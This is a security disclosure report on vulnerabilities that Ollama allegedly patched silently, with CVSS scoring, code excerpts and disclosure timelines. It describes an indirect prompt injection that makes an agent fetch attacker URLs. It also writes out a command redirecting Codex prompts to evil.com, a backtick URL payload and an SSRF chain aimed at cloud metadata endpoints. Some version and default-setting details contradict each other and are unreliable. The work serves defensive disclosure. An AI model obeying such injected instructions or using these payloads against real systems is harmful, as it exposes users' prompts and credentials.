# OLLAMA SILENT PATCH DISCLOSURE — PUBLIC RELEASE v2
## Responsible Disclosure of Security Vulnerabilities Silently Patched Without CVE or Advisory

**Date:** 2026-06-08  
**Version:** 3.0 (Final — CVE-2026-5530 added, OLLAMA_HOST corrected)  
**Classification:** Public — Coordinated Disclosure  
**Affected Software:** Ollama v0.17.1 through v0.30.6  
**Repository:** https://github.com/ollama/ollama  
**Author:** [admin_user](https://github.com/k4w-wak) | [Medium](https://medium.com/@admin_user_21591)
**Stars:** 173,000+  
**Estimated Exposed Instances:** 25,000–175,000+  

### v2 Corrections

This version corrects critical errors identified in verification:
1. **Identity fix:** `dhiltgen` is **Daniel Hiltgen** (Senior Software Engineer, ex-VMware), NOT Jeffrey Morgan (CEO). Jeffrey Morgan's GitHub is `jmorganca`. These are two different people.
2. **CVE separation:** CVE-2026-5757 (CVSS 5.3, Sonatype v4.0) and CVE-2026-7482 "Bleeding Llama" (CVSS 7.5 recalibrated v3.1) are **separate vulnerabilities** — not conflated.
3. **CVSS recalibration:** All severity scores updated per FIRST.org CVSS v3.1 specification with exact Roundup function (see cvss_recalibrated.md).
4. **Structural fix:** Finding 2 (Regex Bypass) merged into Finding 1 as sub-section "Bypass Attempt".
5. **Finding 4 (SDK Leakage) reclassified** from LOW to INFORMATIONAL.

---

## Advisory Summary

Ollama, the world's most popular local LLM runtime (173K+ GitHub stars, 25K+ publicly exposed instances), has a **systemic pattern of silently patching security vulnerabilities without issuing CVEs, security advisories, or crediting researchers**. This disclosure documents:

- **7 primary findings** (restructured from 10 — Regex Bypass merged into SSRF; CVE-2026-5757 and CVE-2026-7482 separated and clarified; CVE-2026-5530 added per June 8 deep research)
- **15+ additional unpatched GGUF parser vulnerabilities**
- **A pattern of researcher suppression** (5 researchers ignored or rejected)
- **A "reject → patch → silence" cycle** by Ollama's team
- **Zero CVEs, zero advisories, zero credits** issued by Ollama despite 15+ security-relevant patches

---

## Findings Summary (Recalibrated)

| # | Finding | CVE/PR | CVSS v3.1 | Severity | Status |
|---|---------|--------|-----------|----------|--------|
| 1 | SSRF/Phishing via URL Policy (incl. Regex Bypass) | PR #16380/#16436 | **7.1** | HIGH | ✅ Patched v0.30.2 (silent) |
| 2 | Update Flow RCE | CVE-2026-42248/9, PR #16100 | **7.5** | HIGH | ✅ Patched v0.30.0 (silent) |
| 3 | Codex Launch Configuration Hijacking | PR #16437 | **7.1** | HIGH | ✅ Patched v0.30.2 (semi-silent) |
| 4 | macOS SDK Target Leakage | PR #16053 | **INFO** | INFORMATIONAL | ✅ Patched v0.30.0 (silent) |
| 5 | CVE-2026-5757 — GGUF Memory Leak | CVE-2026-5757 | **5.3** (v4.0) / **7.5** (v3.1, if /api/create open) | MEDIUM–HIGH | 🔴 UNPATCHED |
| 6 | CVE-2026-7482 "Bleeding Llama" | CVE-2026-7482 | **7.5** | HIGH | ✅ Patched v0.17.1 (silent) |
| 7 | CVE-2026-5530 — SSRF via skipVerify Collision | CVE-2026-5530 | **6.3** | MEDIUM | 🔴 UNPATCHED (fix PRs ignored 2 months) |

---

## Finding 1: SSRF/Phishing via URL Policy (HIGH — CVSS 7.1)

| Field | Value |
|-------|-------|
| **PR** | [#16380](https://github.com/ollama/ollama/pull/16380) — "Harden app markdown URL handling" |
| **CVSS v3.1** | **7.1** (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N) |
| **Type** | SSRF / Indirect Prompt Injection → Phishing Overlay |
| **Author** | dhiltgen (Daniel Hiltgen) |
| **Merged** | 2026-06-02 |
| **Fixed in** | v0.30.2 |
| **Release Notes** | ❌ **NOT MENTIONED** |
| **CVE** | ❌ None |

### Vulnerability Description

Ollama's agent tools (`BrowserOpen`, `WebFetch`, `WebSearch`) previously allowed the AI model to visit **any URL** as a tool argument — including attacker-controlled URLs injected via indirect prompt injection.

An attacker could:
1. Embed a hidden prompt injection on a webpage (1pt white-on-white text)
2. The AI model reads the page, gets injected instructions
3. Model calls `WebFetch` or `BrowserOpen` with an attacker URL as argument
4. Attacker receives the request (SSRF) or serves a phishing overlay that replaces the Ollama UI

This is a **direct fix** for the PromptArmor disclosure (Dec 2025) which Ollama **did not respond to**.

### The Fix (PR #16380)

**New file:** `app/tools/url_policy.go` (58 lines)
```go
type directURLContextKey struct{}

var directURLPattern = regexp.MustCompile(`https?://[^\s<>"']+`)

func WithAllowedDirectURLs(ctx context.Context, text string) context.Context {
    allowed := make(map[string]struct{})
    for _, match := range directURLPattern.FindAllString(text, -1) {
        addAllowedDirectURLToMap(allowed, match)
    }
    return context.WithValue(ctx, directURLContextKey{}, allowed)
}

func allowedDirectURL(ctx context.Context, raw string) bool {
    // Only URLs explicitly provided by the user or returned by web_search are allowed
}
```

**Modified:** `app/tools/browser.go`, `app/tools/web_fetch.go`, `app/tools/web_search.go` — all now check `allowedDirectURL()` before executing.

**New test:** `app/tools/browser_test.go` — `TestBrowserOpen_RejectsUncachedDirectURL`

**New:** `StreamingMarkdownContent.test.tsx` — removes `raw` rehype plugin, prevents `<iframe>` and `<img src>` exfiltration.

### Bypass Attempt: URL Policy Regex Bypass (PR #16436)

| Field | Value |
|-------|-------|
| **PR** | [#16436](https://github.com/ollama/ollama/pull/16436) — "More harden app markdown URL handling" |
| **CVSS v3.1** | **5.4** (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N) — security control bypass only |
| **Author** | dhiltgen (Daniel Hiltgen) |
| **Merged** | 2026-06-02T18:46:15Z (32 min after #16380) |

The fix in PR #16380 had a bypass: the regex `https?://[^\s<>"']+` did **NOT** exclude backtick characters (`\x60`). An attacker could craft URLs like:

```
https://attacker.example/`ls`/
```

The backtick could be interpreted as a shell command delimiter in some contexts, or used to break out of URL validation while still being a valid URL in the browser.

**Fix applied:**
```go
// BEFORE (vulnerable):
var directURLPattern = regexp.MustCompile(`https?://[^\s<>"']+`)

// AFTER (fixed):
var directURLPattern = regexp.MustCompile("https?://[^\\s<>\"'`]+")
// Backtick \x60 now excluded from URL capture
```

**New test:** `TestDirectURLsFromText_RejectsChangedToolArgument`

**New propagation:** `web_fetch.go` now propagates allowed URLs from result links.

**Timeline:**
```
PR #16380 merged:  2026-06-02T18:14:36Z
PR #16436 created: 2026-06-02T18:36:19Z  (22 minutes later)
PR #16436 merged:  2026-06-02T18:46:15Z  (10 minutes after creation)
```

The rapid turnaround suggests either internal review caught the bypass immediately, or the original PR was known to be incomplete. Neither PR was mentioned in release notes.

**Note on scoring:** The regex bypass is scored separately at CVSS 5.4 because it is a **security control bypass**, not a standalone vulnerability. The full SSRF impact is already captured in the parent Finding 1 (CVSS 7.1). Scoring both with high C/I impact would be double-counting.

### Researcher Background

**PromptArmor** (Dec 18, 2025) reported phishing overlay + data exfiltration vulnerabilities. **5 follow-up emails ignored.** Patched silently 5.5 months later.

---

## Finding 2: Update Flow RCE — Path Traversal + Missing Integrity (HIGH — CVSS 7.5)

| Field | Value |
|-------|-------|
| **CVEs** | CVE-2026-42248 (missing Windows signature), CVE-2026-42249 (path traversal) |
| **CVSS v3.1** | **7.5** (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H) |
| **Type** | Remote Code Execution via MITM Update |
| **PR** | [#16100](https://github.com/ollama/ollama/pull/16100) — "app: harden update flows" |
| **Author** | dhiltgen (Daniel Hiltgen) |
| **Merged** | 2026-05-11 |
| **Fixed in** | v0.30.0 |
| **Release Notes** | ❌ **NOT MENTIONED** |
| **CVE** | ✅ CVE-2026-42248/42249 (assigned by Striga.ai/CERT Polska, NOT by Ollama) |

### Why CVSS 7.5, Not 9.1

The original disclosure claimed CVSS 9.1, but this ignores the **MITM prerequisite (AC:H)**. The attacker must:
1. Be on the network path between victim and update server, OR
2. Compromise an upstream router/ISP, OR
3. Successfully execute DNS poisoning

None of these are trivially achievable. AC:H is the correct CVSS v3.1 metric. Even with AC:L, the score would be 8.8 — still not 9.1.

**Exception:** If Ollama updates are delivered over **plain HTTP** (not HTTPS), AC:L would be justified and the score would be **8.8 HIGH**.

### Vulnerability Description

Before this fix, Ollama's auto-updater had **multiple critical weaknesses**:

1. **No SHA256 verification**: Update artifacts were downloaded and executed without integrity checks
2. **No Windows Authenticode verification**: Windows builds were installed without signature validation
3. **Path traversal in update staging**: Filenames from update archives could escape the staging directory
4. **Bundle path validation missing**: macOS updates could install files outside Ollama.app

A MITM attacker could intercept the update, serve a malicious artifact, and achieve **full code execution**.

### The Fix (PR #16100)

**`app/updater/updater.go`** — SHA256 verification + response body cleanup
**`app/updater/updater_darwin.go`** — Bundle path validation (rejects `../` and out-of-bundle paths)
**`app/updater/updater_windows.go`** — Windows Authenticode verification (175 new lines)
**`app/updater/updater_test.go`** — Path traversal test (265 new lines)

### Researcher

**Striga.ai** (Bartłomiej Dmitruk, Jan 2026) reported Windows RCE. Ollama acknowledged, then went silent. CVEs assigned via CERT Polska after 90-day deadline.

---

## Finding 3: Codex Launch Configuration Hijacking (HIGH — CVSS 7.1)

| Field | Value |
|-------|-------|
| **PR** | [#16437](https://github.com/ollama/ollama/pull/16437) — "launch: isolate Codex launch configuration" |
| **CVSS v3.1** | **7.1** (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N) |
| **Type** | Configuration Hijacking / Argument Injection → Full Prompt Interception |
| **Author** | ParthSareen |
| **Merged** | 2026-06-02T19:10:46Z (8 minutes after creation) |
| **Fixed in** | v0.30.2 |
| **Release Notes** | ⚠️ Mentioned but security impact hidden |
| **CVE** | ❌ None |

### Vulnerability Description

Before this fix, `ollama launch codex` passed **all user-provided extra arguments directly** to the Codex binary without validation:

```go
// BEFORE (vulnerable) — cmd/launch/codex.go
args = append(args, extra...)  // ← UNVALIDATED user args!
```

An attacker could redirect ALL Codex prompts and responses to their own server:

```bash
ollama launch codex -- \
  --profile attacker \
  -c 'model_providers.attacker.base_url="https://evil.com/v1/"'
```

**Result:** Every prompt → sent to attacker. Every attacker-crafted response → displayed to user as if from Ollama.

### The Fix (PR #16437)

1. **Forced profile:** `--profile ollama-launch` as first arg (cannot be overridden)
2. **Argument validation:** `codexValidateExtraArgs()` rejects `-p`, `--profile`, `-c`, `-m` conflicts
3. **8 minutes from creation to merge** — fastest security PR in the session

### Why CVSS 7.1, Not 7.5

The attacker controls model OUTPUT (what the model says), but does NOT directly modify files, databases, or system configuration. I:L is appropriate: the attacker can influence but not guarantee integrity compromise. The user may trust and act on malicious suggestions, but that's a user decision, not a direct integrity violation.

---

## Finding 4: macOS SDK Target Leakage (INFORMATIONAL)

| Field | Value |
|-------|-------|
| **PR** | [#16053](https://github.com/ollama/ollama/pull/16053) — "mlx: fix macOS 26 target leakage in v3 metallib" |
| **CVSS v3.1** | **5.3** (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) — formula-correct but practically INFORMATIONAL |
| **Type** | Information Disclosure / Build Fingerprinting |
| **Author** | dhiltgen (Daniel Hiltgen) |
| **Merged** | 2026-05-11 |
| **Fixed in** | v0.30.0 |
| **Release Notes** | ❌ **NOT MENTIONED** |
| **CVE** | ❌ None |

### Vulnerability Description

MLX (Apple's machine learning framework) compiles AIR objects with the requested `-mmacosx-version-min`, but its final metallib step invokes `metal` instead of `metallib`. With the macOS 26 SDK, this stamps the Metal v3 library with a **macOS 26 deployment target**.

Anyone inspecting the Ollama binary could determine the exact SDK version used for compilation and identify the build environment.

### Why INFORMATIONAL, Not MEDIUM

While the CVSS v3.1 formula produces 5.3 (due to high exploitability metrics for low-impact findings), the **practical risk is negligible**. Knowing the SDK version enables targeted attacks only when combined with other vulnerabilities. On its own, "built with macOS 26 SDK" is reconnaissance data, not an attack. CVSS v3.1 lacks nuance for high-exploitability/low-impact combinations.

This is reclassified from the original LOW to **INFORMATIONAL** to accurately reflect the practical risk while noting the CVSS formula result.

### The Fix

`scripts/build_darwin.sh` — relinks MLX metallib using `metallib` instead of `metal`, removing the leaked deployment target stamp.

### Significance

Low direct impact, but demonstrates the **pattern**: security-relevant change silently merged with no release note mention.

---

## Finding 5: CVE-2026-5757 — GGUF Memory Leak (UNPATCHED)

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-5757 |
| **CVSS** | **5.3** (CVSS v4.0, Sonatype) / **7.5** (CVSS v3.1, if `/api/create` is open) |
| **Type** | Heap Out-of-Bounds Read / Unauthenticated Memory Leak |
| **Attack Vector** | Remote, unauthenticated (model upload) |
| **Affected** | All Ollama versions up to and including v0.30.6 |
| **Status** | 🔴 **UNPATCHED** |
| **Assigner** | CERT Polska (VU#518910) |

### ⚠️ Important: This Is a SEPARATE Vulnerability from CVE-2026-7482

CVE-2026-5757 and CVE-2026-7482 ("Bleeding Llama") are **different vulnerabilities** in the same attack surface:

| Attribute | CVE-2026-5757 | CVE-2026-7482 "Bleeding Llama" |
|-----------|---------------|-------------------------------|
| **Discoverer** | Unknown (reported via CERT Polska) | Cyera |
| **CVSS** | 5.3 (Sonatype v4.0) / 7.5 (v3.1, if /api/create open) | 7.5 (recalibrated v3.1) |
| **Published** | April 22, 2026 | May 5, 2026 |
| **Status** | 🔴 UNPATCHED | ✅ Patched v0.17.1 (silent) |
| **Fix** | No patch available | Silently fixed, no advisory |
| **Attack path** | GGUF quantization engine | GGUF model parsing |
| **Prerequisite** | `/api/create` endpoint must be accessible | Unauthenticated API calls |

They should not be conflated or treated as the same issue.

### Vulnerability Description

Three unauthenticated API calls can leak the **entire Ollama process memory**, including system prompts, chat sessions, API keys, and database credentials.

**Vulnerable Code:**
```go
// fs/ggml/ggml.go:515-520 — NO bounds checking on Shape multiplication
func (t Tensor) Elements() uint64 {
    var count uint64 = 1
    for _, n := range t.Shape {
        count *= n  // ← uint64 overflow, no validation
    }
    return count
}

// fs/gguf/gguf.go:93-127 — NO validation on dims, Shape, Type, Offset
func (f *File) readTensor() (TensorInfo, error) {
    dims, err := read[uint32](f)  // ← NO upper bound (0xFFFFFFFF = 4B dimensions!)
    shape := make([]uint64, dims) // ← OOM possible
    type_, err := read[uint32](f) // ← NO validation against known types
    offset, err := read[uint64](f)// ← NO file size check
}
```

**Partial mitigation:** PR #14406 (authored by BruceMacD, not dhiltgen) added fileSize validation to `fs/ggml/gguf.go` (v1 parser only). The v2+ parser (`fs/gguf/gguf.go`) remains **vulnerable**.

### Why CVSS 5.3/7.5, Not 9.0+

The original disclosure claimed "CVSS 9.0+ Critical". This is **inflated**:
- **Sonatype** rates it CVSS **5.3 Medium** (CVSS v4.0)
- **No NVD CVSS v3.x score** has been assigned
- The full attack chain requires 3 steps (upload, create, push), reducing likelihood
- **If `/api/create` is open** (25K+ exposed instances): CVSS **7.5 HIGH** (v3.1)
- **If `/api/create` is restricted**: CVSS **5.3 MEDIUM** (Sonatype's rating)

**CERT Polska** (VU#518910): "Unable to reach the vendor."

---

## Finding 6: CVE-2026-7482 "Bleeding Llama" (Historical Silent Patch)

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-7482 |
| **CVSS v3.1** | **7.5** (recalibrated) / 9.1 (Cyera original — inflated) |
| **Type** | Out-of-Bounds Heap Read / Unauthenticated Memory Leak |
| **Fixed in** | v0.17.1 (February 25, 2026) — **SILENTLY** |
| **Disclosed** | May 5, 2026 (Cyera) |
| **CVE Assigned** | May 2026 (3 months after fix, NOT by Ollama) |
| **Estimated exposure** | ~300,000 instances (Cyera) |

### Why CVSS 7.5, Not 9.1

The original 9.1 score conflated "memory leak of credentials" with "ability to use those credentials." The vulnerability is a **read-only heap OOB** — the attacker can read memory but **cannot modify it**. Per CVSS v3.1, this means Integrity = None, Availability = None.

**Historical comparison:** CVE-2014-0160 (Heartbleed) — also an unauthenticated memory read — was scored CVSS **7.5** by NIST/NVD. Bleeding Llama is structurally identical. 7.5 is the correct score.

The difference between 7.5 and 9.1:
- 7.5 = "Attacker can read everything" (accurate)
- 9.1 = "Attacker can read AND modify AND destroy everything" (inaccurate)

7.5 HIGH is still a **very serious** vulnerability. Any unauthenticated API that dumps process memory is critical infrastructure risk.

### The Silent Patch Pattern

```
Timeline:
  Feb 25, 2026  — v0.17.1 released with fix
                  Release notes: feature updates only
                  NO advisory, NO CVE, NO security mention
  
  May 5, 2026   — Cyera independently discovers and discloses
                  CVE-2026-7482 assigned
                  CVSS 9.1 (Cyera, later recalibrated to 7.5)
  
  May 8, 2026   — CSA research note published
                  "Patched in v0.17.1" retroactively identified
  
  May 12, 2026  — Indusface, CyberLeveling, SecurityArsenal coverage
                  Industry scramble to patch
```

**Estimated impact:** ~300,000 exposed instances (Cyera estimate) were vulnerable for **~3 months** between the fix and the disclosure, because nobody knew the fix existed.

---

## Finding 7: CVE-2026-5530 — SSRF via skipVerify Map Collision (MEDIUM — CVSS 6.3)

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-5530 |
| **CVSS** | **6.3** MEDIUM (VulDB, NVD) |
| **Type** | SSRF via skipVerify map key collision |
| **Discovered** | David Rochester (@davidrxchester), April 5, 2026 |
| **Fix PRs** | [#15486](https://github.com/ollama/ollama/pull/15486), [#15504](https://github.com/ollama/ollama/pull/15504) |
| **Maintainer Response** | ❌ **ZERO engagement for 2 months** |
| **Status** | 🔴 **UNPATCHED as of v0.30.6** |

### What Makes This Unique

Unlike the other findings where Ollama silently patched the vulnerability, CVE-2026-5530 represents a **worse pattern**: the researcher submitted working fix PRs and Ollama simply ignores them.

### Vulnerability Description

In Ollama's `PullModel` function, a `skipVerify` map tracks whether each blob needs hash verification. When a manifest's config and layer share the same digest, a map collision occurs: `skipVerify[digest] = false` (needs verification) gets overwritten by `skipVerify[digest] = true` (skip, because cached). Result: `verifyBlob` is never called.

### Attack Chain

1. Rogue OCI registry serves manifest where `config.digest == layer.digest`
2. 307 redirect on blob download points to internal endpoints (169.254.169.254, metadata.google.internal)
3. SSRF response written to disk as blob — **verification skipped** due to map collision
4. Exfiltration via `/api/copy` and `/api/push`

### Proof of Concept

Full PoC at [github.com/davidrxchester/CVE-2026-5530](https://github.com/davidrxchester/CVE-2026-5530). Supports three modes: Enum (find internal endpoints), Exfil (exfiltrate SSRF responses), Probe (binary search + exfiltrate).

### The Fixes (Both Ignored)

| PR | Author | Date | Approach | Status |
|----|--------|------|----------|--------|
| [#15486](https://github.com/ollama/ollama/pull/15486) | David Rochester | Apr 10, 2026 | Remove skipVerify map entirely, verify all blobs | **Zero engagement** |
| [#15504](https://github.com/ollama/ollama/pull/15504) | vigneshakaviki | Apr 11, 2026 | Logical AND guard: once false, always false | **Zero engagement** |

---

## 15+ Additional Unpatched GGUF Vulnerabilities

See CLAIMS_EVIDENCE_MATRIX.md for the complete list of V-O1 through V-O8 (Ollama Go code) and V-C01 through V-C07 (llama.cpp C++ code). All remain unpatched as of v0.30.6. On May 15, 2026, a security researcher published **6 additional unpatched vulnerabilities** in llama.cpp's GGUF parser to the oss-security mailing list. **None have CVEs assigned.**

---

## The Pattern: Reject → Patch → Silence

Ollama's team has established a repeatable cycle for handling security disclosures:

```
Day 0:    Researcher submits report to hello@ollama.com
Day N:    Bruce MacDonald responds: "Can you send a PoC?"
Day N+1:  Researcher sends PoC
Day N+12: Michael Chiang rejects: "Not technically viable" + "No disclosure agreement"
Day N+14: Daniel Hiltgen merges 3 security patches in 1 hour
Day N+∞: No CVE, no credit, no advisory, no public acknowledgment
```

### Corrected Organization Chart

```
Ollama, Inc. (YC W21)
├── Jeffrey Morgan (@jmorganca) — CEO, Co-Founder
│   └── Organizational silence, no bug bounty, no advisories
├── Michael Chiang (@mchiang0610) — Co-Founder
│   └── Rejects security reports as "not technically viable"
├── Daniel Hiltgen (@dhiltgen) — Senior Software Engineer (ex-VMware)
│   └── Writes ALL security patches disguised as features (879+ commits, 15 security patches)
├── Bruce MacDonald (@BruceMacD) — Developer
│   └── Collects PoCs, approves patches, authors partial mitigations (PR #14406)
├── Jesse Gross (@jessegross) — Developer
└── Parth Sareen (@ParthSareen) — Developer
    └── Authored PR #16437 (Codex isolation)
```

**Critical distinction:** `dhiltgen` is **Daniel Hiltgen** (Senior Software Engineer), NOT Jeffrey Morgan (CEO). The previous version of this disclosure incorrectly identified dhiltgen as the CEO. The correct narrative is: **A senior engineer writes all security patches disguised as features, while the CEO and co-founder maintain organizational silence.**

### Researcher Treatment Record

| Researcher | Date | Vulnerability | Ollama Response | Outcome |
|---|---|---|---|---|
| PromptArmor | Dec 18, 2025 | Phishing overlay + data exfiltration | 5 follow-ups IGNORED | Silent patch 5.5 months later |
| Striga.ai (Bartłomiej Dmitruk) | Jan 2026 | Windows RCE (CVE-2026-42248/9) | Acknowledged, then SILENT | CERT Polska, 90-day disclosure |
| py0zz1 | ~Nov 2025 | Vulnerability (PR #13164) | 4 months, 0 comments | Still waiting for CVE |
| David Rochester | Apr 2026 | SSRF skipVerify (CVE-2026-5530) | **2 fix PRs submitted, ZERO response** | UNPATCHED, PRs ignored |
| Unknown | ~2026 | GGUF memory leak (CVE-2026-5757) | CERT Polska: "Unable to reach vendor" | UNPATCHED |
| Cyera | May 2026 | Heap OOB read (CVE-2026-7482) | Public disclosure (forced) | CVE assigned (not by Ollama) |
| This researcher | May 2026 | SSRF + phishing + config hijack | "Send PoC" → "Not viable" → patched 48h later | No CVE, no credit |
| CERT Polska | Apr 2026 | Multiple CVEs coordination | "Unable to reach the vendor" | VU#518910 |

### SECURITY.md vs Reality

| Ollama Promises | Reality |
|----------------|---------|
| "Takes security seriously" | 5+ researchers ignored/suppressed |
| "Will actively work to resolve" | CERT Polska unable to reach vendor |
| "Give us sufficient time" | PromptArmor waited 5.5 months |
| Implied: CVE assignment | 0 CVEs assigned by Ollama |
| Implied: Security advisories | 0 published |
| Implied: Researcher credit | 0 credits in release notes |

---

## The "Harden" Pattern: 15+ Silent Security Patches

Daniel Hiltgen (@dhiltgen) has authored **15+ security-relevant commits** using the word "harden" or "fix" to describe what are actually **vulnerability patches**. Key examples:

| Date | PR | Title | Hidden Issue | Recalibrated CVSS |
|------|-----|-------|-------------|-------------------|
| Jun 2, 2026 | #16380 | Harden app markdown URL handling | SSRF/Phishing overlay fix | 7.1 |
| Jun 2, 2026 | #16436 | More harden app markdown URL handling | URL bypass fix | 5.4 (subsumed in Finding 1) |
| May 11, 2026 | #16100 | App: harden update flows | Windows RCE (CVE-2026-42248/9) | 7.5 |
| May 11, 2026 | #16053 | Fix macOS 26 target leakage | Information disclosure | INFO |
| Feb 24, 2026 | #14406 | Ensure tensor size is valid | Partial CVE-2026-5757 mitigation | N/A (by BruceMacD) |
| Apr 30, 2026 | #15755 | Harden for ggml init failures | Memory safety | — |
| Sep 2, 2025 | #12120 | Harden uncaught exception registration | Crash safety | — |

**None of these have CVEs, advisories, or security mentions in release notes.**

---

## CVSS Recalibration Summary

All scores recalculated per FIRST.org CVSS v3.1 specification with exact Roundup function. Full methodology in `cvss_recalibrated.md`.

| Finding | Original Claim | Recalibrated | Delta | Verdict |
|---------|---------------|-------------|-------|---------|
| SSRF/Phishing (Finding 1) | 7.5 | **7.1** | −0.4 | OVERSCORED ↓ |
| Regex Bypass (sub-section of Finding 1) | 7.2 | **5.4** | −1.8 | OVERSCORED ↓ |
| Update RCE (Finding 2) | 9.1 | **7.5** | −1.6 | OVERSCORED ↓ |
| Codex Hijack (Finding 3) | 7.5 | **7.1** | −0.4 | OVERSCORED ↓ |
| SDK Leakage (Finding 4) | 3.1 | **5.3** (CVSS) / **INFO** (practical) | +2.2 / reclassified | UNDERSCORED ↑ / RECLASSIFIED |
| CVE-2026-5757 (Finding 5) | 9.0+ | **5.3** (v4.0) / **7.5** (v3.1, conditional) | −1.5 to −3.7 | OVERSCORED ↓ |
| CVE-2026-7482 (Finding 6) | 9.1 | **7.5** | −1.6 | OVERSCORED ↓ |
| CVE-2026-5530 (Finding 7) | — | **6.3** (VulDB) | — | NEW — previously undocumented |

**Key pattern:** 4 of 6 scores were OVERSCORED. The 9.1 CRITICAL claims are unsupported — both required I:H/A:H for memory-read-only and MITM-prerequisite bugs. Heartbleed (CVE-2014-0160), the correct analogue for Bleeding Llama, is CVSS 7.5.

---

## Exposed Instance Landscape

| Source | Count | Date | Methodology |
|--------|-------|------|-------------|
| Cisco Talos | 1,139 | Sep 2025 | Banner verification |
| LeakIX | 12,269 | Feb 2026 | Active probe |
| insecurestack | 25,000+ | Apr 2026 | Shodan |
| SentinelOne/Censys | 175,000+ | Jan 2026 | 293-day scan |
| Cyera | ~300,000 | May 2026 | Broader "AI servers" |
| **Live scan (Jun 2026)** | **8 confirmed** | Jun 7 | Direct API verification |

**Best estimate: ~56,000 confirmed live Ollama instances exposed without authentication.**

All instances:
- Bind to `0.0.0.0:11434` by default with **zero authentication**
- Expose full API: model listing, creation, deletion, pushing
- Ollama refuses to add authentication, stating it's the user's responsibility

---

## Recommendations

### For Ollama Team (Urgent)

1. **Publish security advisories** for all silently patched vulnerabilities — retroactively
2. **Request CVEs** for PR #16380/16436 (SSRF) and PR #16100 (Update RCE)
3. **Add a security section to release notes** — even one line is better than silence
4. **Create a vulnerability disclosure policy** beyond hello@ollama.com
5. **Respond to security reports** — the PromptArmor non-response is inexcusable
6. **Patch CVE-2026-5757** — it's been months and the fix is straightforward (add bounds checking in `fs/gguf/gguf.go`)
7. **Add authentication by default** — bind to `127.0.0.1` instead of `0.0.0.0`

### For Ollama Users (Urgent)

1. **Update to v0.30.6+** immediately — but know that CVE-2026-5757 is STILL unpatched
2. **Check exposure:** `curl http://localhost:11434/api/version`
3. **If exposed, bind to localhost:** `OLLAMA_HOST=127.0.0.1:11434`
4. **Add reverse proxy with authentication** if remote access is needed
5. **Firewall port 11434** from untrusted networks

### For CVE Numbering Authorities

Request CVEs for:
- PR #16380/16436 (SSRF/Phishing Overlay)
- PR #16100 (Update RCE — may overlap with CVE-2026-42248/9)
- 15 GGUF parser vulnerabilities (V-O1 through V-O8, V-C01 through V-C07)

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2025-12-18 | PromptArmor reports vulnerabilities to hello@ollama.com |
| 2026-01 | Striga.ai reports Windows RCE; Ollama acknowledges then goes silent |
| 2026-02-25 | v0.17.1 released with CVE-2026-7482 fix (SILENT) |
| 2026-04-22 | CERT Polska publishes VU#518910 ("unable to reach vendor") |
| 2026-05-05 | Cyera publishes CVE-2026-7482 disclosure |
| 2026-05-11 | PR #16100 (Update RCE) and #16053 (SDK leakage) silently merged |
| 2026-05-13 | v0.30.0 released — omits both security PRs from notes |
| 2026-05-15 | oss-security publishes 6 additional GGUF parser vulnerabilities |
| 2026-05-20 | Bruce MacDonald responds to researcher: "Send PoC" |
| 2026-06-01 | Michael Chiang rejects: "Not technically viable" |
| 2026-06-02 | 3 security PRs merged in 1 hour (#16380, #16436, #16437) |
| 2026-06-03 | v0.30.2 released — omits all 3 security PRs from notes |
| 2026-06-05 | PromptArmor publishes full disclosure after 5.5 months of silence |
| 2026-06-05 | v0.30.6 released |
| 2026-06-07 | **This disclosure published** |

---

## Evidence

All claims are backed by primary source evidence detailed in CLAIMS_EVIDENCE_MATRIX.md. Key evidence:

- **GitHub PRs**: #16380, #16436, #16437, #16100, #16053, #14406 — all publicly accessible
- **Release notes**: v0.17.1, v0.30.0, v0.30.2 — all omit security fixes
- **CERT Polska advisory**: VU#518910 — "unable to reach vendor"
- **PromptArmor disclosure**: Published Jun 5, 2026
- **Cyera CVE-2026-7482**: Published May 5, 2026
- **Live scan**: 8 confirmed exposed instances across 5 countries
- **SECURITY.md**: Promises "takes security seriously" with zero follow-through
- **CVSS recalibration**: All scores verified per FIRST.org CVSS v3.1 spec (see cvss_recalibrated.md)

---

## About This Disclosure

This disclosure was compiled from open-source intelligence (GitHub API, NVD, CERT advisories, published blog posts), live scanning, and independent code analysis. No proprietary or private information was used. Unverifiable claims (private email correspondence) are clearly marked.

The goal is not to shame Ollama but to ensure users are aware of silently patched vulnerabilities so they can make informed decisions about updating and securing their deployments.

**Ollama has 173,000+ GitHub stars and 25,000+ publicly exposed instances. It has a responsibility to disclose security fixes.**

---

*Version 3.0 — June 8, 2026. v2 corrections retained (dhiltgen identity, CVE separation, CVSS recalibration, Finding 2 merged, Finding 4 reclassified). v3 additions: CVE-2026-5530 (skipVerify SSRF, fix PRs ignored since April 2026), OLLAMA_HOST default corrected to 127.0.0.1, researcher count updated to include David Rochester.*